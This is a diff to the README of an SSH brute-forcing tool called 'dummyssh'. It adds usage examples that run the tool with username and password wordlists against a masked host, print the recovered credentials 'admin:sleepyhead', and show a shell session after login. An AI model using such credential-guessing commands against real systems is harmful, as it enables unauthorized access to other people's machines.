@@ -28,7 +28,10 @@ Alternatively, you can run the pre-built binary in this repo for your OS and see
 
 ```
 
-Example:
+Examples:
+
+Password and username are not known:
+
 
 ```
 ./dummyssh -U users.txt -P passwords.txt -h xxx.xxx.xxx.xxx
@@ -39,6 +42,25 @@ pwd
 
 ls
 passwordreminder.txt
+
+exit
+
+Exiting...
+```
+Username is not known:
+
+```
+./dummyssh -U users.txt -p sleepyhead -h xxx.xxx.xxx.xxx
+
+ !!!! Connection established! Correct creds are: admin:sleepyhead !!!!
+pwd
+/home
+
+ls
+passwordreminder.txt
+
+whoami
+admin
 
 exit
 
